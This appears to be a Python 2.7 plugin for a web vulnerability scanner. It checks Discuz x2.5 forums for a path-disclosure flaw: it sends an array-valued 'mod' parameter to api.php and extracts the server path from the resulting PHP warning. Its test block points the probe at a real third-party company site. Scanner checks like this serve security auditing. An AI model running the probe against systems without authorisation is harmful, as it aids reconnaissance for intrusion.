#!/usr/bin/python2.7
#coding:utf-8

import requests
import re
from dummy import *

info = {
	'NAME':'Discuz x2.5 Path Disclosure',
	'AUTHOR':'seay,yangbh',
	'TIME':'20140811',
	'WEB':'',
	'DESCRIPTION':''
}

def Audit(services):
	retinfo = None
	output = ''
	if services.has_key('url') and services.has_key('cms'):
		if services['cms'] == 'Discuz':
			if services.has_key('cmsversion') == False or \
				(services.has_key('cmsversion') and services['cmsversion'] == 'x2.5'):
				output += 'plugin run' + os.linesep
				url = services['url'] + '/api.php?mod[]=Seay'
				try:
					rqu = requests.get(url)
					if rqu.status_code == 200:
						res = rqu.text
						m = re.search('<b>Warning</b>:[^\r\n]+or an integer in <b>([^<]+)api\.php</b> on line <b>(\d+)</b>', res)
						if m:
							retinfo = {'level':'low','content':m.group(1)}
							output += 'Vula:\t' + url
				except:
					pass
	return (retinfo,output)
# ----------------------------------------------------------------------------------------------------
#	untest yet
# ----------------------------------------------------------------------------------------------------
if __name__=='__main__':
	services = {'url':'http://www.hengtiansoft.com'}
	pprint(Audit(services))
	pprint(services)